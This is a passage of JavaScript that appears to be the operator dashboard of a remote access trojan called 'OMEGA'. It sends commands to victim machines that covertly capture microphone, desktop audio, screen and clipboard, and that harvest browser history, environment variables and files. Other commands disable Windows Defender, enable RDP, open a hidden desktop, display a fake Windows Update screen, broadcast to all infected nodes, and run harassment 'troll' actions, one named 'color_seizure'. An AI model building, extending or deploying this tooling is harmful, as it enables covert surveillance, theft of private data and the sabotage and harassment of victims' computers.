    const url  = URL.createObjectURL(blob);
    const img  = $('pip-cam-img');
    if (!img) return;
    const old = img.src;
    img.src = url;
    if (old && old.startsWith('blob:')) URL.revokeObjectURL(old);
    const wrap = $('pip-cam-wrap');
    if (wrap && wrap.style.display === 'none' && _camOn) wrap.style.display = 'flex';
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — AUDIO CONTROLS
// ════════════════════════════════════════════════════════════════════════════════
let _desktopAudioOn = false;
let _micOn          = false;
let _audioCtx       = null;
let _audioQueue     = [];

function toggleDesktopAudio() {
    _desktopAudioOn = !_desktopAudioOn;
    const btn = $('btn-desktop-audio');
    if (_desktopAudioOn) {
        safeSend({ t: 'desktop_audio_on', type: 'desktop_audio_on' });
        if (btn) { btn.classList.add('active'); btn.title = 'Desktop Audio: ON'; }
        logIntel('Desktop audio capture started', 'ok');
        if (!_audioCtx) _audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
    } else {
        safeSend({ t: 'desktop_audio_off', type: 'desktop_audio_off' });
        if (btn) { btn.classList.remove('active'); btn.title = 'Desktop Audio: OFF'; }
        logIntel('Desktop audio stopped', 'info');
    }
}

function toggleMicAudio() {
    _micOn = !_micOn;
    const btn = $('btn-mic-audio');
    if (_micOn) {
        safeSend({ t: 'mic_on', type: 'mic_on' });
        if (btn) { btn.classList.add('active'); btn.title = 'Mic: ON'; }
        logIntel('Microphone capture started', 'ok');
    } else {
        safeSend({ t: 'mic_off', type: 'mic_off' });
        if (btn) { btn.classList.remove('active'); btn.title = 'Mic: OFF'; }
        logIntel('Microphone stopped', 'info');
    }
}

function playPcmV22(buf) {
    if (!_audioCtx) return;
    try {
        const view    = new Int16Array(buf);
        const floats  = new Float32Array(view.length);
        for (let i = 0; i < view.length; i++) floats[i] = view[i] / 32768;
        const abuf    = _audioCtx.createBuffer(1, floats.length, 44100);
        abuf.copyToChannel(floats, 0);
        const src = _audioCtx.createBufferSource();
        src.buffer = abuf;
        src.connect(_audioCtx.destination);
        src.start();
    } catch {}
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — SCREEN RECORDER
// ════════════════════════════════════════════════════════════════════════════════
let _mediaRecorder  = null;
let _recChunks      = [];
let _recordingActive = false;

function toggleScreenRecorder() {
    if (_recordingActive) stopScreenRecorder();
    else startScreenRecorder();
}

function startScreenRecorder() {
    const img = $('desktopViewImg');
    if (!img || !streaming) { showToast('Start the stream first', 'warn'); return; }
    try {
        const canvas = document.createElement('canvas');
        canvas.width  = img.naturalWidth  || 1280;
        canvas.height = img.naturalHeight || 720;
        const ctx = canvas.getContext('2d');
        const stream = canvas.captureStream(15);
        _mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
        _recChunks = [];
        _mediaRecorder.ondataavailable = e => { if (e.data.size > 0) _recChunks.push(e.data); };
        _mediaRecorder.onstop = () => {
            const blob = new Blob(_recChunks, { type: 'video/webm' });
            const url  = URL.createObjectURL(blob);
            const a    = document.createElement('a');
            a.href = url; a.download = `omega_rec_${Date.now()}.webm`;
            a.click(); URL.revokeObjectURL(url);
            logIntel('Screen recording saved', 'ok');
        };
        _mediaRecorder.start(500);
        _recordingActive = true;

        // Draw stream frames into canvas continuously
        function drawFrame() {
            if (!_recordingActive) return;
            if (img.src && img.src !== '#') ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            requestAnimationFrame(drawFrame);
        }
        drawFrame();

        const btn = $('btn-rec');
        if (btn) { btn.classList.add('active'); btn.title = 'Stop Recording'; }
        logIntel('Screen recording started (WebM)', 'ok');
    } catch (e) {
        logIntel('Recorder error: ' + e.message, 'err');
    }
}

function stopScreenRecorder() {
    if (_mediaRecorder && _mediaRecorder.state !== 'inactive') _mediaRecorder.stop();
    _recordingActive = false;
    const btn = $('btn-rec');
    if (btn) { btn.classList.remove('active'); btn.title = 'Start Recording'; }
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — VOLUME SLIDER
// ════════════════════════════════════════════════════════════════════════════════
let _currentVolume = 50;

function sendVolume(level) {
    _currentVolume = parseInt(level);
    safeSend({ t: 'troll', type: 'troll', action: 'set_volume', value: _currentVolume });
}

function updateVolumeDisplay(level) {
    _currentVolume = level;
    const slider = $('vol-slider');
    const label  = $('vol-label');
    if (slider) slider.value = level;
    if (label)  label.textContent = level + '%';
}

function getRemoteVolume() {
    safeSend({ t: 'troll', type: 'troll', action: 'get_volume' });
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — CLIPBOARD
// ════════════════════════════════════════════════════════════════════════════════
let _clipMonitorOn = false;
let _clipLog = [];

function handleClipboardUpdate(text) {
    _clipLog.unshift({ time: new Date().toLocaleTimeString(), text });
    if (_clipLog.length > 100) _clipLog.pop();
    renderClipLog();
    logIntel(`Clipboard captured: ${text.substring(0, 40)}…`, 'ok');
}

function renderClipLog() {
    const el = $('clip-log');
    if (!el) return;
    el.innerHTML = _clipLog.slice(0, 30).map(e =>
        `<div class="clip-entry"><span class="clip-ts">${escHtml(e.time)}</span><span class="clip-val">${escHtml(e.text.substring(0,200))}</span></div>`
    ).join('');
}

function readClipboard()    { safeSend({ t: 'clip_read',        type: 'clip_read' }); }
function clearClipLog()     { _clipLog = []; renderClipLog(); }

function injectClipboard() {
    const text = ($('clip-inject-input') || {}).value || '';
    if (!text) return;
    safeSend({ t: 'clip_write', type: 'clip_write', text });
    logIntel('Clipboard injected', 'ok');
}

function toggleClipMonitor() {
    _clipMonitorOn = !_clipMonitorOn;
    const btn = $('btn-clip-monitor');
    if (_clipMonitorOn) {
        safeSend({ t: 'clip_monitor_on', type: 'clip_monitor_on' });
        if (btn) { btn.textContent = '⏹ Stop Monitor'; btn.classList.add('active'); }
        logIntel('Clipboard monitor started', 'ok');
    } else {
        safeSend({ t: 'clip_monitor_off', type: 'clip_monitor_off' });
        if (btn) { btn.textContent = '▶ Start Monitor'; btn.classList.remove('active'); }
        logIntel('Clipboard monitor stopped', 'info');
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — RECON PANELS
// ════════════════════════════════════════════════════════════════════════════════

// Connections (netstat)
function fetchConnections() {
    safeSend({ t: 'get_connections', type: 'get_connections' });
    logIntel('Fetching active connections…', 'info');
}

function renderConnections(data) {
    const el = $('connections-tbody');
    if (!el) return;
    el.innerHTML = data.map(c =>
        `<tr>
          <td style="font-family:monospace;font-size:11px;color:var(--accent-violet)">${escHtml(c.type||'')}</td>
          <td style="font-family:monospace;font-size:11px">${escHtml(c.laddr||'')}</td>
          <td style="font-family:monospace;font-size:11px;color:var(--accent-teal)">${escHtml(c.raddr||'')}</td>
          <td style="font-size:11px">${escHtml(c.status||'')}</td>
          <td style="font-size:11px;color:var(--text-muted)">${escHtml(c.process||'')} (${c.pid||''})</td>
        </tr>`).join('') || '<tr><td colspan="5" style="text-align:center;padding:2rem;color:var(--text-muted)">No data</td></tr>';
}

// LAN Scan
function startLanScan() {
    safeSend({ t: 'lan_scan', type: 'lan_scan' });
    $('lan-scan-tbody') && ($('lan-scan-tbody').innerHTML = '<tr><td colspan="4" style="text-align:center;padding:2rem;color:var(--accent-amber)">Scanning… (up to 15s)</td></tr>');
    logIntel('LAN sweep started…', 'info');
}

function renderLanScan(data) {
    const el = $('lan-scan-tbody');
    if (!el) return;
    el.innerHTML = data.length === 0
        ? '<tr><td colspan="4" style="text-align:center;color:var(--text-muted)">No hosts found</td></tr>'
        : data.map(h =>
            `<tr>
              <td style="font-family:monospace;font-size:12px;color:var(--accent-violet)">${escHtml(h.ip)}</td>
              <td style="font-size:11px">${escHtml(h.hostname||'—')}</td>
              <td><span style="color:var(--accent-teal);font-size:11px">▲ UP</span></td>
              <td style="font-family:monospace;font-size:10px;color:var(--text-muted)">${(h.open_ports||[]).join(', ')||'—'}</td>
            </tr>`).join('');
    logIntel(`LAN scan complete — ${data.length} hosts found`, 'ok');
}

// Installed Software
function fetchSoftware() {
    safeSend({ t: 'get_software', type: 'get_software' });
    logIntel('Fetching installed software…', 'info');
}

function renderSoftwareList(data) {
    const el = $('software-tbody');
    if (!el) return;
    el.innerHTML = data.map(s =>
        `<tr>
          <td style="font-size:12px">${escHtml(s.name)}</td>
          <td style="font-size:11px;color:var(--text-muted)">${escHtml(s.displayversion||'')}</td>
          <td style="font-size:11px;color:var(--text-muted)">${escHtml(s.publisher||'')}</td>
          <td style="font-size:11px;color:var(--text-muted)">${escHtml(s.installdate||'')}</td>
        </tr>`).join('') || '<tr><td colspan="4">No data</td></tr>';
    logIntel(`${data.length} installed programs loaded`, 'ok');
}

// Browser History
function fetchHistory() {
    safeSend({ t: 'get_history', type: 'get_history', limit: 200 });
    logIntel('Fetching browser history…', 'info');
}

function renderHistoryList(data) {
    const el = $('history-tbody');
    if (!el) return;
    el.innerHTML = data.map(h =>
        `<tr>
          <td style="font-size:10px;color:var(--accent-violet)">${escHtml(h.browser||'')}</td>
          <td style="font-size:10px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><a href="${escHtml(h.url)}" target="_blank" style="color:var(--accent-blue);text-decoration:none">${escHtml((h.title||h.url).substring(0,60))}</a></td>
          <td style="font-size:10px;color:var(--text-muted)">${h.visits||0}</td>
        </tr>`).join('') || '<tr><td colspan="3">No data</td></tr>';
}

// Startup Programs
function fetchStartup() {
    safeSend({ t: 'get_startup', type: 'get_startup' });
    logIntel('Fetching startup programs…', 'info');
}

function renderStartupList(data) {
    const el = $('startup-tbody');
    if (!el) return;
    el.innerHTML = data.map(s =>
        `<tr>
          <td style="font-size:12px;color:var(--text-primary)">${escHtml(s.name)}</td>
          <td style="font-size:10px;font-family:monospace;color:var(--text-muted);max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(s.command||'')}</td>
          <td style="font-size:10px;color:var(--text-muted)">${escHtml(s.location||'')}</td>
          <td>
            ${s.reg_path ? `<button class="btn btn-ghost" style="padding:2px 8px;font-size:10px;color:var(--accent-red)" onclick="removeStartup('${escHtml(s.reg_path)}',${s.hive||0},'${escHtml(s.name)}')">Remove</button>` : ''}
          </td>
        </tr>`).join('') || '<tr><td colspan="4">No data</td></tr>';
}

function removeStartup(regPath, hive, name) {
    if (!confirm(`Remove startup entry: ${name}?`)) return;
    safeSend({ t: 'remove_startup', type: 'remove_startup', reg_path: regPath, hive, name });
    logIntel(`Removing startup: ${name}`, 'warn');
    setTimeout(fetchStartup, 1000);
}

// Env Vars
function fetchEnv() {
    safeSend({ t: 'get_env', type: 'get_env' });
    logIntel('Fetching environment variables…', 'info');
}

function renderEnvVars(data) {
    const el = $('env-tbody');
    if (!el) return;
    el.innerHTML = Object.entries(data).map(([k,v]) =>
        `<tr>
          <td style="font-family:monospace;font-size:11px;color:var(--accent-violet);white-space:nowrap">${escHtml(k)}</td>
          <td style="font-family:monospace;font-size:10px;color:var(--text-secondary);max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(v)}</td>
        </tr>`).join('') || '<tr><td colspan="2">No data</td></tr>';
}

// GeoIP Map
function fetchGeo() {
    safeSend({ t: 'get_geo', type: 'get_geo' });
    logIntel('Fetching GeoIP data…', 'info');
}

function renderGeoInfo(data) {
    const el = $('geo-info-panel');
    if (!el) return;
    el.innerHTML = `
      <div class="geo-flag" style="font-size:3rem;text-align:center;margin-bottom:0.5rem">${getFlagEmoji(data.country_code||'')}</div>
      <table style="width:100%;border-collapse:collapse;font-size:0.82rem;">
        ${[
            ['IP',      data.ip],
            ['Country', data.country],
            ['Region',  data.region],
            ['City',    data.city],
            ['ISP',     data.isp],
            ['Lat/Lon', `${data.lat}, ${data.lon}`],
        ].map(([k,v]) => `<tr><td style="color:var(--text-muted);padding:3px 8px;width:80px">${k}</td><td style="font-family:monospace;color:var(--text-primary)">${escHtml(String(v||'—'))}</td></tr>`).join('')}
      </table>
      ${(data.lat && data.lon) ? `<div style="margin-top:0.8rem;border-radius:8px;overflow:hidden;border:1px solid var(--border-default)"><img src="https://staticmap.openstreetmap.de/staticmap.php?center=${data.lat},${data.lon}&zoom=8&size=400x160&markers=${data.lat},${data.lon},red-marker" style="width:100%;display:block" onerror="this.style.display='none'"></div>` : ''}
    `;
    logIntel(`GeoIP: ${data.city}, ${data.country} (${data.ip})`, 'ok');
}

function getFlagEmoji(code) {
    if (!code || code.length !== 2) return '🌐';
    const offset = 127397;
    return String.fromCodePoint(...[...code.toUpperCase()].map(c => c.charCodeAt(0) + offset));
}

// RDP / Defender
function toggleRdp(enable) {
    safeSend({ t: 'toggle_rdp', type: 'toggle_rdp', v: enable });
    logIntel(`RDP ${enable ? 'enabling…' : 'disabling…'}`, 'warn');
}

function toggleDefender(enable) {
    safeSend({ t: 'toggle_defender', type: 'toggle_defender', v: enable });
    logIntel(`Defender ${enable ? 'enabling…' : 'disabling…'}`, 'warn');
}

// Multi-node broadcast
function broadcastToAll(cmd) {
    if (!cmd) return;
    safeSend({ t: 'broadcast', type: 'broadcast', cmd });
    logIntel(`Broadcast sent: ${cmd}`, 'warn');
}

// Screenshot scheduler
let _schedOn = false;
function toggleSchedSS() {
    _schedOn = !_schedOn;
    const interval = parseInt(($('sched-interval-input')||{}).value || 10);
    const btn = $('btn-sched-ss');
    if (_schedOn) {
        safeSend({ t: 'sched_ss_on', type: 'sched_ss_on', interval });
        if (btn) { btn.textContent = '⏹ Stop Scheduler'; btn.classList.add('active'); }
        logIntel(`Screenshot scheduler ON (every ${interval}s)`, 'ok');
    } else {
        safeSend({ t: 'sched_ss_off', type: 'sched_ss_off' });
        if (btn) { btn.textContent = '▶ Start Scheduler'; btn.classList.remove('active'); }
        logIntel('Screenshot scheduler OFF', 'info');
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — NEW TROLL FUNCTIONS
// ════════════════════════════════════════════════════════════════════════════════
function sendTrollV22(action, value) {
    safeSend({ t: 'troll', type: 'troll', action, value: value || '' });
    logIntel(`Troll: ${action}`, 'warn');
}

function flipScreen(angle) {
    sendTrollV22('flip_screen', angle);
}

function ejectCD() {
    sendTrollV22('eject_cd');
}

function toggleChaos() {
    const btn = $('btn-chaos');
    const isChaos = btn && btn.classList.contains('active');
    if (isChaos) {
        sendTrollV22('stop_chaos');
        if (btn) btn.classList.remove('active');
    } else {
        sendTrollV22('chaos_mouse');
        if (btn) btn.classList.add('active');
    }
}

function sendChatPopup() {
    const text = ($('chat-popup-input')||{}).value || 'Hello from OMEGA!';
    sendTrollV22('chat_popup', text);
}

function sendPrinterSpam() {
    const text = ($('printer-text-input')||{}).value || 'OMEGA SPAM';
    sendTrollV22('printer_spam', text);
}

function sendFakeUpdate() {
    sendTrollV22('fake_update');
}

function killExplorer()  { sendTrollV22('kill_explorer'); }
function startExplorer() { sendTrollV22('start_explorer'); }
function hideIcons()     { sendTrollV22('hide_icons'); }
function showIcons()     { sendTrollV22('show_icons'); }

// ════════════════════════════════════════════════════════════════════════════════
// v25 — EXTENDED TROLL HELPERS
// ════════════════════════════════════════════════════════════════════════════════

/**
 * sendTroll(action, valueOrParams?, extraParams?)
 *   action       — troll action string
 *   valueOrParams — string value, or an object of additional params
 *   extraParams  — optional extra object (merged last)
 *
 * Examples:
 *   sendTroll('freeze_screen')
 *   sendTroll('msg', 'hello world')
 *   sendTroll('url_spam', { value: 'https://...', count: 10 })
 *   sendTroll('color_seizure', { count: 40 })
 */
function sendTroll(action, valueOrParams, extraParams) {
    if (!currentTargetId) { logIntel('No target selected', 'err'); return; }

    const msg = { t: 'troll', type: 'troll', action };

    if (typeof valueOrParams === 'string' || typeof valueOrParams === 'number') {
        msg.value = valueOrParams;
    } else if (valueOrParams && typeof valueOrParams === 'object') {
        Object.assign(msg, valueOrParams);
    }
    if (extraParams && typeof extraParams === 'object') {
        Object.assign(msg, extraParams);
    }

    safeSend(msg);
    logIntel(`Troll: ${action}`, 'warn');
}

// Drag chaos toggle
let _dragChaosActive = false;
function toggleDragChaos() {
    const btn = $('btn-drag-chaos');
    _dragChaosActive = !_dragChaosActive;
    if (_dragChaosActive) {
        sendTrollV22('drag_chaos');
        if (btn) { btn.classList.add('active'); btn.textContent = '✋ Stop Drag Chaos'; }
    } else {
        sendTrollV22('drag_chaos_stop');
        if (btn) { btn.classList.remove('active'); btn.textContent = '🪟 Drag Chaos'; }
    }
}

// Camera extras — cam snapshot stores last frame for cam_freeze_frame
// Already handled by renderCamFrame → st.last_cam_frame on agent side

// ════════════════════════════════════════════════════════════════════════════════
// STREAM OVERLAY CONTROLS
// ════════════════════════════════════════════════════════════════════════════════

let _overlayMNKActive = false;

function toggleOverlayMNK() {
    _overlayMNKActive = !_overlayMNKActive;
    const btn = $('ovr-mnk-btn');

    if (_overlayMNKActive) {
        // Enable mouse + keyboard control on agent
        safeSend({ t: 'troll', type: 'troll', action: 'unlock_mnk' });
        if (btn) {
            btn.style.background = 'rgba(16,212,168,0.85)';
            btn.textContent = '🖱️ Control: ON';
        }
        // Also make sure MNK overlay is on for remote input
        if (!_mnkOverlayOn) toggleMNKOverlay();
        logIntel('Remote control ENABLED', 'ok');
    } else {
        safeSend({ t: 'troll', type: 'troll', action: 'lock_mnk' });
        if (btn) {
            btn.style.background = 'rgba(255,71,87,0.85)';
            btn.textContent = '🖱️ Control: OFF';
        }
        logIntel('Remote control DISABLED', 'warn');
    }
}

// Keep overlay FPS in sync with the main FPS counter
(function _ovrFpsSync() {
    setInterval(() => {
        const src = $('streamFps');
        const dst = $('ovr-fps');
        if (src && dst && src.textContent !== '—') {
            dst.textContent = src.textContent.replace(' fps','').replace('fps','').trim();
        }
    }, 500);
})();

// Sync audio overlay button to reflect state
function _syncOverlayAudioBtns() {
    const audioBtn = $('ovr-audio-btn');
    const micBtn   = $('ovr-mic-btn');
    if (audioBtn) {
        audioBtn.textContent  = _desktopAudioOn ? '🔊 Audio ON' : '🔇 Audio';
        audioBtn.style.borderColor = _desktopAudioOn ? 'var(--accent-teal)' : 'rgba(255,255,255,0.15)';
    }
    if (micBtn) {
        micBtn.textContent  = _micOn ? '🎙️ Mic ON' : '🎙️ Mic';
        micBtn.style.borderColor = _micOn ? 'var(--accent-violet)' : 'rgba(255,255,255,0.15)';
    }
}

// Hook into toggle functions to also update overlay
const _origToggleDesktopAudio = typeof toggleDesktopAudio === 'function' ? toggleDesktopAudio : null;
const _origToggleMicAudio     = typeof toggleMicAudio     === 'function' ? toggleMicAudio     : null;

// ════════════════════════════════════════════════════════════════════════════════
// v22 — UPDATE BINARY HANDLER to route cam frames + MIC audio
// ════════════════════════════════════════════════════════════════════════════════
// Override the existing handleBinary to add cam frame routing and mic audio
const _origHandleBinary = typeof handleBinary === 'function' ? handleBinary : null;
function handleBinary(buf) {
    const view = new Uint8Array(buf);
    if (view.length < 2) return;
    const tag     = view[0];
    const payload = buf.slice(1);

    if (tag === 0x03) {
        renderLiveFrame(payload, 'desktopViewImg');
        if (isGridView) updateGridCell(0, payload);
        if (_recordingActive) { /* frame already on img, drawFrame() loop handles it */ }
    } else if (tag === 0x04) {
        renderCamFrame(payload);
        renderLiveFrame(payload, 'cameraViewImg');
    } else if (tag === 0x05) {
        if (_desktopAudioOn) playPcmV22(payload);
        else if (typeof playPcm === 'function') playPcm(payload);
    } else if (tag === 0x06) {
        downloadHarvestZip(payload);
    } else if (tag === 0x07) {
        if (_micOn) playPcmV22(payload);
    } else if (tag === 0x0A) {
        // Hidden operator desktop frame
        _renderHiddenDesktopFrame(payload);
    } else if (tag >= 0x10 && tag <= 0x13) {
        const monIdx = tag - 0x10;
        updateGridCell(monIdx, payload);
    }
}

// ════════════════════════════════════════════════════════════════════════════════
// FAKE UPDATE SCREEN  +  HIDDEN DESKTOP
// ════════════════════════════════════════════════════════════════════════════════

// ── Fake Update controls ───────────────────────────────────────────────────
let _fakeUpdateActive = false;

function deployFakeUpdate() {
    if (!currentTargetId) { logIntel('No target', 'err'); return; }
    safeSend({ t: 'troll', type: 'troll', action: 'fake_update_screen' });
    logIntel('🪟 Deploying fake Windows Update screen…', 'warn');
}

function revertFakeUpdate() {
    if (!currentTargetId) { logIntel('No target', 'err'); return; }
    safeSend({ t: 'troll', type: 'troll', action: 'revert_fake_update' });
    logIntel('↩ Reverting fake update…', 'warn');
}

// Handle server confirmation of fake update state
function _onFakeUpdateState(msg) {
    _fakeUpdateActive = !!msg.active;
    const btnDeploy = $('btn-fake-update-deploy');
    const btnRevert = $('btn-fake-update-revert');
    const badge     = $('fake-update-badge');
    if (btnDeploy) {
        btnDeploy.style.background = _fakeUpdateActive ? 'var(--accent-red)' : '';
        btnDeploy.style.color      = _fakeUpdateActive ? '#fff' : '';
    }
    if (btnRevert) btnRevert.disabled = !_fakeUpdateActive;
    if (badge) {
        badge.textContent = _fakeUpdateActive ? '🔴 ACTIVE' : '⚫ STANDBY';
        badge.style.color = _fakeUpdateActive ? 'var(--accent-red)' : 'var(--text-muted)';
    }
    logIntel(msg.msg || (msg.active ? 'Fake update active' : 'Fake update cleared'), 'warn');
    showToast(msg.msg || 'Fake update state changed', msg.active ? 'err' : 'ok');
}

// ── Hidden Desktop controls ─────────────────────────────────────────────────
let _hiddenDeskStreamOn = false;

function openHiddenDesk(prog) {
    if (!currentTargetId) { logIntel('No target', 'err'); return; }
    prog = prog || $('hidden-desk-prog-input')?.value || 'explorer.exe';
    safeSend({ t: 'hidden_desk_open', prog });
    logIntel(`🕵 Opening hidden desktop — running: ${prog}`, 'info');
}

function closeHiddenDesk() {
    safeSend({ t: 'hidden_desk_close' });
    _hiddenDeskStreamOn = false;
    _updateHiddenDeskUI();
    logIntel('Hidden desktop closed', 'warn');
}

function toggleHiddenStream() {
    _hiddenDeskStreamOn = !_hiddenDeskStreamOn;
    if (_hiddenDeskStreamOn) {
        safeSend({ t: 'hidden_desk_stream_on' });
    } else {
        safeSend({ t: 'hidden_desk_stream_off' });
    }
    _updateHiddenDeskUI();
}

function snapHiddenDesk() {
    safeSend({ t: 'hidden_desk_snap' });
    logIntel('Hidden desktop snapshot requested', 'info');
}

function _updateHiddenDeskUI() {
    const btn = $('btn-hidden-stream');
    if (!btn) return;
    if (_hiddenDeskStreamOn) {
        btn.textContent  = '⏹ Stop Hidden Stream';
        btn.style.background = 'var(--accent-red)';
        btn.style.color      = '#fff';
        btn.style.border     = 'none';
    } else {
        btn.textContent  = '▶ Start Hidden Stream';
        btn.style.background = '';
        btn.style.color      = '';
        btn.style.border     = '';
    }
}

/** Render a hidden desktop frame into the operator-side viewer. */
function _renderHiddenDesktopFrame(payload) {
    const blob = new Blob([payload], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);
    const img  = $('hidden-desk-view');
    if (img) {
        if (img._prevUrl) URL.revokeObjectURL(img._prevUrl);
        img._prevUrl = url;
        img.src = url;
    }
    // Show the hidden desk panel if it was hidden
    const panel = $('hidden-desk-panel');
    if (panel) panel.style.display = 'flex';
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — TOAST NOTIFICATION
// ════════════════════════════════════════════════════════════════════════════════
function showToast(msg, type = 'info') {
    const colors = { ok: '#10d4a8', warn: '#fbbf24', err: '#ff4757', info: '#a78bfa' };
    const t = document.createElement('div');
    t.style.cssText = `position:fixed;bottom:calc(20px + ${document.querySelectorAll('.omega-toast').length * 56}px);left:50%;
        transform:translateX(-50%);background:rgba(13,13,26,0.96);border:1px solid ${colors[type]||colors.info};
        color:#fff;padding:0.6rem 1.4rem;border-radius:12px;font-size:0.82rem;font-weight:600;
        box-shadow:0 10px 30px rgba(0,0,0,0.5);z-index:9999;
        animation:fadeSlideIn 0.3s ease;pointer-events:none;`;
    t.className = 'omega-toast';
    t.innerHTML = `<span style="color:${colors[type]||colors.info};margin-right:6px">●</span>${escHtml(msg)}`;
    document.body.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; t.style.transition = '0.3s'; setTimeout(() => t.remove(), 350); }, 3000);
}

// ════════════════════════════════════════════════════════════════════════════════
// v22 — NODE ACTIONS auto-request geo on open
// ════════════════════════════════════════════════════════════════════════════════
const _origOpenRemoteNode = typeof openRemoteNode === 'function' ? openRemoteNode : null;
function openRemoteNode(nodeId, mode) {
    if (_origOpenRemoteNode) _origOpenRemoteNode(nodeId, mode || 'view');
    // Auto-fetch geo for each node opened
    setTimeout(() => {
        safeSend({ t: 'get_geo', type: 'get_geo' });
    }, 800);
}
